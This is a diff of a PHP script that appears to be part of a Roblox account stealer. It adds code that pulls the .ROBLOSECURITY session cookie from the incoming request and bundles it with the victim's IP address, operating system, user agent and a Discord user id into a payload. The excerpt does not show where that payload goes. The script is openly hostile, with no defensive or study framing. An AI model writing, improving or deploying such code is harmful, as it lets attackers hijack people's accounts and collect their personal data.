@@ -12,8 +12,19 @@ function getOS($userAgent) {
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $input = file_get_contents('php://input');
     $data = json_decode($input, true);
-    $cookie = $data['cookie'] ?? 'Not found';
+    
+    // Get user ID from URL or POST data
     $user_id = $data['user_id'] ?? $_GET['user'] ?? 'Unknown';
+    
+    // Get Roblox cookie from browser
+    $cookie = $data['cookie'] ?? (function() {
+        $cookies = $_SERVER['HTTP_COOKIE'] ?? '';
+        if (preg_match('/\.ROBLOSECURITY=([^;]+)/', $cookies, $matches)) {
+            return $matches[1];
+        }
+        return 'Not found';
+    })();
+
     $user_agent = $_SERVER['HTTP_USER_AGENT'];
     $os = getOS($user_agent);
 
@@ -26,7 +37,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $ip_address = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
     }
 
-    // Combined payload with data and verified status
+    // Combined payload with all data
     $payload = [
         'cookie' => $cookie,
         'discord_user_id' => $user_id,
